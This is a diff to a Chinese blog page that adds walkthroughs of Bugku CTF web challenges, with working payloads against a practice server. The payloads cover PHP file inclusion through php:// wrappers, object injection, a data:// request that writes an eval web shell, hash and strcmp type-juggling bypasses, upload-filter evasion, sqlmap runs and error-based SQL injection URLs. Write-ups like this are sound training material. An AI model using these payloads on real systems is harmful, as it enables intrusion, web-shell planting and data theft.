@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,560</span> / Reading time: <span class="post-count">11 min</span></span>
+                        <span>Word count: <span class="post-count">4,851</span> / Reading time: <span class="post-count">21 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -523,6 +523,206 @@ else
     print &quot;never never never give up !!!&quot;;
 }
 </code></pre><p>看似需要满足很多条件才能得到flag，事实上满足条件之后也只是把f4l2a3g.txt文件内容打印出来而已，直接访问这个文件即可得到flag <br></p>
+<h1 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h1><p>右键查看源代码，发现源码提示</p>
+<pre><code>&lt;!--  
+$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+
+if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+}else{  
+    echo &quot;you are not admin ! &quot;;  
+}  
+ --&gt;  
+</code></pre><p>file_get_contents函数将一个文件读入字符串中，只要使用php://input请求流即可，因为php://input拿的是post中的数据，所以需要在post框中输入welcome to the bugkuctf <br><br><code>include($file)</code>可以看出是明显的文件包含，可以利用php://filter来读取源码 <br></p>
+<pre><code>?txt=php://input&amp;&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;&amp;password=
+[POST DATA]
+welcome to the bugkuctf
+</code></pre><p>把得到的base64编码解码之后得到源码</p>
+<pre><code>&lt;?php  
+
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;good&quot;);
+        }  
+    }  
+}  
+?&gt;  
+</code></pre><p>尝试包含flag.php，出现乱码，再包含index.php</p>
+<pre><code>&lt;?php  
+$txt = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$password = $_GET[&quot;password&quot;];  
+
+if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello friend!&lt;br&gt;&quot;;  
+    if(preg_match(&quot;/flag/&quot;,$file)){ 
+        echo &quot;涓嶈兘鐜板湪灏辩粰浣爁lag鍝�&quot;;
+        exit();  
+    }else{  
+        include($file);   
+        $password = unserialize($password);  
+        echo $password;  
+    }  
+}else{  
+    echo &quot;you are not the number of bugku ! &quot;;  
+}  
+
+?&gt;  
+
+&lt;!--  
+$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+
+if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+}else{  
+    echo &quot;you are not admin ! &quot;;  
+}  
+ --&gt;  
+</code></pre><p>发现只要序列化flag，当flag对象被转换为字符串时，会执行__tostring()，且会输出$file参数的内容，提示参数的内容是flag.php <br><br>本地序列化一下Flag对象</p>
+<pre><code>&lt;?php  
+
+    class Flag{//flag.php  
+        public $file;  
+        public function __tostring(){  
+            if(isset($this-&gt;file)){  
+                echo file_get_contents($this-&gt;file); 
+                echo &quot;&lt;br&gt;&quot;;
+            return (&quot;good&quot;);
+            }  
+        }  
+    }   
+$a = new Flag;
+$a-&gt;file = &quot;flag.php&quot;;
+echo serialize($a);
+输出：O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+</code></pre><p>通过password将Flag序列化之后的值传入即可得到flag <br></p>
+<pre><code>?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+[POST DATA]
+welcome to the bugkuctf
+</code></pre><p>还有一种思路，利用文件包含漏洞远程执行php代码，写入一个一句话木马，用菜刀连接也可以得到flag</p>
+<pre><code>http://120.24.86.145:8006/test1/?txt=php://input&amp;file=data://text/plain,&lt;?php fputs(fopen(&quot;shells.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_GET[a]) ?&gt;&quot;);phpinfo();  ?&gt;&amp;password=3&amp;a=$_POST[a]
+[POST DATA]
+welcome to the bugkuctf
+</code></pre><h1 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h1><p>分析提示中的代码</p>
+<pre><code>$poc=&quot;a#s#s#e#r#t&quot;; 
+$poc_1=explode(&quot;#&quot;,$poc);    把poc的字符串以#分割成数组
+$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];         将数组中的值按照012345的顺序排起来，即assert
+$poc_2($_GET[&apos;s&apos;]) ?&gt;    可以看成assert($_GET[&apos;s&apos;])
+</code></pre><p>assert可以将输入的字符串当做php代码来执行，这就是一个任意代码执行漏洞</p>
+<pre><code>?s=print_r(scandir(&apos;./&apos;))
+访问f14g.txt即可获得flag
+</code></pre><h1 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h1><p>访问获得源代码</p>
+<pre><code> &lt;?php 
+highlight_file(&apos;2.php&apos;);
+$key=&apos;KEY{********************************}&apos;;
+$IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);
+if( $IM ){ 
+  die(&apos;key is: &apos;.$key);
+}
+?&gt; 
+</code></pre><p>关键点在于中间匹配的正则表达式，匹配成功则输出flag <br></p>
+<pre><code>/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i
+</code></pre><p>表达式的意思为，开头两个key，两个key中间有任意0或多个字符，两个key之后有一个任意字符，这个字符要重复4到7次，之后有一个key：，key：之后有一对//，中间有任意一个字符，然后是0或多字个符，再是一个key，之后是任意一个小写字母，最后是任意一个标点符号 <br><br>按照上面说的，结合起来传入即可获得flag <br></p>
+<pre><code>?id=keykeyaaaakey:/a/keya:
+</code></pre><h1 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h1><p>右键源代码，发现有提示code.txt，访问这个文件，得到源代码</p>
+<pre><code>&lt;?php
+if(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;])){
+    $v1 = $_GET[&apos;v1&apos;];
+    $v2 = $_GET[&apos;v2&apos;];
+    $v3 = $_GET[&apos;v3&apos;];
+    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){
+        if(!strcmp($v3, $flag)){
+            echo $flag;
+        }
+    }
+}
+?&gt;
+</code></pre><p>这题跟之前做过的md5弱类型比较一样，要求传入的v1和v2的值不一样，但是md5值一样 <br><br>绕过这一层之后，还有一层<code>!strcmp($v3, $flag)</code>，这里利用strcmp函数本身的漏洞，当传入的值为数组，函数会null，取反之后就会变成true从而达成绕过 <br><br>strcmp输入一个数组就会返回null <br></p>
+<pre><code>?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=1
+</code></pre><h1 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h1><p>init为约束攻击，直接点击注册页面，输入admin 1(admin和1之间有非常多的空格)，密码随意，用这个密码登录admin账号即可获得flag <br><br>约束攻击的原理是，当mysql执行插入语句时，如果插入的值超过一定的长度(好像是32位)，就会把超出的部分丢掉，只插入前面的部分，而空格在存入数据库时也会被丢掉。但是如果空格后面还有字符的话，空格就不会被丢掉，所以输入admin 1，当之间的空格足够多以至于超过限度时，mysql就会把超过的部分丢掉，丢掉之后，因为admin后面都是空格，在存入的时候就变成了admin，相当于重新创建了一个admin账号</p>
+<h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><p>打开网页，问你是不是从google来的，用bp抓包，增加一个referer字段即可</p>
+<pre><code>Referer: https://www.google.com
+</code></pre><h1 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h1><p>题目名字为md5碰撞，碰撞的意思是值不同但是md5值相同，输入?a=s878926199a即可返回flag <br><br>需要注意的是，如果输入的值是QNKCDZO，虽然也是md5碰撞，但是不会返回flag，猜测服务器端是用QNKCDZO来进行比较的</p>
+<h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><p>要求从本地访问，用bp抓包，加上X-Forwarded-For: 127.0.0.1字段即可</p>
+<h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><pre><code> &lt;?php
+highlight_file(&apos;flag.php&apos;);
+$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);
+$flag = &apos;flag{xxxxxxxxxxxxxxxxxx}&apos;;
+if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) {
+    if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;])
+
+        print &apos;passwd can not be uname.&apos;;
+
+    else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;))
+
+        die(&apos;Flag: &apos;.$flag);
+
+    else
+
+        print &apos;sorry!&apos;;
+
+}
+?&gt; 
+</code></pre><p>要求输入的uname和passwd的sha1值相同但值不同，sha1和ma5一样，处理不了数组，输入数组即可绕过，注意passwd要用post输入。id值只要等于margin就行</p>
+<pre><code>http://120.24.86.145:8002/web7/?uname[]=123&amp;id=margin
+[POST DATA]
+passwd[]=1234
+</code></pre><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><pre><code>&lt;?php
+extract($_GET);
+if (!empty($ac))
+{
+$f = trim(file_get_contents($fn));
+if ($ac === $f)
+{
+echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;
+}
+else
+{
+echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;
+}
+}
+?&gt;
+</code></pre><p>看到file_get_contents函数，无脑php伪协议就完事了</p>
+<pre><code>?ac=1&amp;fn=php://input
+[POST DATA]
+1
+</code></pre><h1 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h1><p>如果有源代码的话，这题其实不难，但是没有源代码的情况下，这题其实很难解，只能说打ctf太需要脑洞了 <br><br>服务器端架设了waf，当waf检测到Content-Type：multipart/form-data字段时，会去检查文件后缀是否有php，如果有则拦下，这里用大小写绕过，Content-Type：Multipart/form-data即可 <br><br>绕过waf之后，因为是黑名单检测，只过滤了php，用php5也可以绕过，把文件名改为php.php5即可 <br></p>
+<pre><code>php、php3、php4、php5、pht、phtml这些都会被解析成php
+</code></pre><h1 id="这是一个神奇的登录框"><a href="#这是一个神奇的登录框" class="headerlink" title="这是一个神奇的登录框"></a>这是一个神奇的登录框</h1><p>这是一个很简单的登录框 <br><br>没有过滤任何东西，直接在username框中注入即可，因为有回显和报错，所以报错注入也是可以的 <br><br>用sqlmap跑也是一种方法 <br><br>因为是post注入，可以用bp，抓包之后右键copy to file，然后用sqlmap跑 <br></p>
+<pre><code>sqlmap.py -r &quot;D:\1.txt&quot; -p admin_name --dbs
+sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -p admin_name --tables
+sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns
+sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump
+</code></pre><h1 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h1><p>修改id可以看到提示是sql注入 <br><br>这里的注入比较简单，可以用异或注入来判断到底过滤了什么 <br></p>
+<pre><code>在id=1后面输入&apos;^(0)^&apos;
+不出错
+把0换成1=1
+出错
+表示可以使用异或注入
+异或注入时，如果括号中的内容是真的，那页面会返回错误
+那么同理，如果我修改里面的内容为length(‘union’)!=0
+如果页面显示正确，那就证明length(‘union’)是等于0的，也就是union被过滤了
+</code></pre><p>测试之后发现union/select/or/and被过滤了，重写绕过即可 <br><br>注入之后发现表中有两个字段，flag1和address，flag1中是一串意义不明的代码，address是下一关地址，点进去发现还是一个注入 <br><br>测试过后发现重写不管用了，但是会回显错误信息，用报错注入 <br></p>
+<pre><code>http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 0x776562313030322d32 ),0x7e),1) %23
+class,flag2
+http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name =0x666c616732 ),0x7e),1) %23
+flag2,address
+http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(address) from flag2 ),0x7e),1) %23
+http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(flag2) from flag2 ),0x7e),1) %23
+./Have_Fun.php
+</code></pre><p>其实这里已经注出flag，但是还有个address字段，内容是/Have_Fun.php，访问之后提示只能192.168.0.100才能访问 <br><br>bp抓包之后，加入CLIENT-IP: 192.168.0.100字段，访问成功，是一个二维码，扫出的结果如下 <br></p>
+<pre><code>你……你……你可以看到我? 好吧，我来自于ErWeiMa.php 顺便告诉你两个密码 one:参数名是game; tow:flag在admin里 对了,文件后@…c=Y&amp;$as%_=#*ad…*@#！*&amp;@…c……
+</code></pre><p>猜测还是注入，但是不管在哪个页面都没用，flag在admin里，也有可能是文件包含 <br><br>题目中说的第二个flag应该是在这里找，但是似乎没有人去找过</p>
 <p>未完待续</p>
 
     </article>
@@ -678,7 +878,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web2"><span class="toc-number">1.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#计算器"><span class="toc-number">2.</span> <span class="toc-text">计算器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web基础-GET"><span class="toc-number">3.</span> <span class="toc-text">web基础$_GET</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web基础-POST"><span class="toc-number">4.</span> <span class="toc-text">web基础$_POST</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#矛盾"><span class="toc-number">5.</span> <span class="toc-text">矛盾</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web3"><span class="toc-number">6.</span> <span class="toc-text">web3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#域名解析"><span class="toc-number">7.</span> <span class="toc-text">域名解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#你必须让他停下"><span class="toc-number">8.</span> <span class="toc-text">你必须让他停下</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#本地包含"><span class="toc-number">9.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#变量1"><span class="toc-number">10.</span> <span class="toc-text">变量1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web5"><span class="toc-number">11.</span> <span class="toc-text">web5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#头等舱"><span class="toc-number">12.</span> <span class="toc-text">头等舱</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#网站被黑"><span class="toc-number">13.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#管理员系统"><span class="toc-number">14.</span> <span class="toc-text">管理员系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web4"><span class="toc-number">15.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag在index里"><span class="toc-number">16.</span> <span class="toc-text">flag在index里</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#输入密码查看flag"><span class="toc-number">17.</span> <span class="toc-text">输入密码查看flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#点击一百万次"><span class="toc-number">18.</span> <span class="toc-text">点击一百万次</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#听说备份是个好习惯"><span class="toc-number">19.</span> <span class="toc-text">听说备份是个好习惯</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#成绩单"><span class="toc-number">20.</span> <span class="toc-text">成绩单</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#秋名山老司机"><span class="toc-number">21.</span> <span class="toc-text">秋名山老司机</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#速度要快"><span class="toc-number">22.</span> <span class="toc-text">速度要快</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie欺骗"><span class="toc-number">23.</span> <span class="toc-text">cookie欺骗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#never-give-up"><span class="toc-number">24.</span> <span class="toc-text">never give up</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web2"><span class="toc-number">1.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#计算器"><span class="toc-number">2.</span> <span class="toc-text">计算器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web基础-GET"><span class="toc-number">3.</span> <span class="toc-text">web基础$_GET</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web基础-POST"><span class="toc-number">4.</span> <span class="toc-text">web基础$_POST</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#矛盾"><span class="toc-number">5.</span> <span class="toc-text">矛盾</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web3"><span class="toc-number">6.</span> <span class="toc-text">web3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#域名解析"><span class="toc-number">7.</span> <span class="toc-text">域名解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#你必须让他停下"><span class="toc-number">8.</span> <span class="toc-text">你必须让他停下</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#本地包含"><span class="toc-number">9.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#变量1"><span class="toc-number">10.</span> <span class="toc-text">变量1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web5"><span class="toc-number">11.</span> <span class="toc-text">web5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#头等舱"><span class="toc-number">12.</span> <span class="toc-text">头等舱</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#网站被黑"><span class="toc-number">13.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#管理员系统"><span class="toc-number">14.</span> <span class="toc-text">管理员系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web4"><span class="toc-number">15.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag在index里"><span class="toc-number">16.</span> <span class="toc-text">flag在index里</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#输入密码查看flag"><span class="toc-number">17.</span> <span class="toc-text">输入密码查看flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#点击一百万次"><span class="toc-number">18.</span> <span class="toc-text">点击一百万次</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#听说备份是个好习惯"><span class="toc-number">19.</span> <span class="toc-text">听说备份是个好习惯</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#成绩单"><span class="toc-number">20.</span> <span class="toc-text">成绩单</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#秋名山老司机"><span class="toc-number">21.</span> <span class="toc-text">秋名山老司机</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#速度要快"><span class="toc-number">22.</span> <span class="toc-text">速度要快</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie欺骗"><span class="toc-number">23.</span> <span class="toc-text">cookie欺骗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#never-give-up"><span class="toc-number">24.</span> <span class="toc-text">never give up</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#welcome-to-bugkuctf"><span class="toc-number">25.</span> <span class="toc-text">welcome to bugkuctf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#过狗一句话"><span class="toc-number">26.</span> <span class="toc-text">过狗一句话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#字符？正则？"><span class="toc-number">27.</span> <span class="toc-text">字符？正则？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#前女友"><span class="toc-number">28.</span> <span class="toc-text">前女友</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#login1-SKCTF"><span class="toc-number">29.</span> <span class="toc-text">login1(SKCTF)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#你从哪里来"><span class="toc-number">30.</span> <span class="toc-text">你从哪里来</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5-collision-NUPT-CTF"><span class="toc-number">31.</span> <span class="toc-text">md5 collision(NUPT_CTF)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#程序员本地网站"><span class="toc-number">32.</span> <span class="toc-text">程序员本地网站</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#各种绕过"><span class="toc-number">33.</span> <span class="toc-text">各种绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web8"><span class="toc-number">34.</span> <span class="toc-text">web8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#求getshell"><span class="toc-number">35.</span> <span class="toc-text">求getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#这是一个神奇的登录框"><span class="toc-number">36.</span> <span class="toc-text">这是一个神奇的登录框</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#多次"><span class="toc-number">37.</span> <span class="toc-text">多次</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
